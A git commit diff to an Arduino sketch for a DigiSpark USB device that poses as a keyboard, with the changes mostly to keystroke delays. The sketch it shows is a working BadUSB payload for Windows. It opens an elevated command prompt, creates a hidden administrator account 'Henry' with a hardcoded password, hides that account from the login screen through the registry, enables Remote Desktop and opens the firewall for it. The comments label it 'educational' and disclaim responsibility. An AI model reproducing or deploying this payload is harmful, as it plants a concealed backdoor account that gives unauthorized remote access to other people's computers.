3c1f3f7b51e8f719a2d9b6d872f3486e1fe050c3
Eduardo Arballo <51279560+EduardoArballo27@users.noreply.github.com>
2022-04-20 22:47:55 -0700

    Update DigiSpark_Presentation_Example.ino

--- DigiSpark_Presentation_Example.ino
+++ DigiSpark_Presentation_Example.ino
@@ -5,6 +5,7 @@
 //Any damage caused by this code is due to missuse and I am not reponsible
 //Strictly for educational purposes ONLY
 //Created in 3-24-22
+
 #include "DigiKeyboard.h"
 #define KEY_TAB      0x2b
 
@@ -16,16 +17,16 @@ void loop() {
   //Small delay to make sure DigiSpark is fully connected
   DigiKeyboard.update();
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(3000);
+  DigiKeyboard.delay(500);
   
   //Runs task manager
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(200);
-  DigiKeyboard.println("taskmgr");
   DigiKeyboard.delay(500);
+  DigiKeyboard.println("taskmgr");
+  DigiKeyboard.delay(900);
   DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT); 
   DigiKeyboard.sendKeyStroke(KEY_N);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(900);
   
   //Opens CMD
   DigiKeyboard.print("cmd /k mode con: cols=15 lines=1");
@@ -34,29 +35,29 @@ void loop() {
   //Turns on Admin Access
   DigiKeyboard.sendKeyStroke(KEY_SPACE);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(200);
+  DigiKeyboard.delay(500);
   
   //Closes Task Manager
   DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(900);
   
   //Creates new account under the name Henry and gives it Admin Access
   DigiKeyboard.println("net user Henry Pass_123 /ADD");
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(900);
   DigiKeyboard.println("net localgroup Administrators Henry /ADD");
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(900);
   
   //Hides account from login screen
   DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v Henry /t REG_DWORD /d 0 /f"));
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(900);
   
   //Turns on Remote Desktop for the account
   DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"));
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(900);
   DigiKeyboard.println(F("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes"));
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(900);
   DigiKeyboard.println("net localgroup \"Remote Desktop Users\" Henry /add");
-  DigiKeyboard.delay(500);  
+  DigiKeyboard.delay(900);  
   DigiKeyboard.println("exit");
 
   //Flashes LED when done
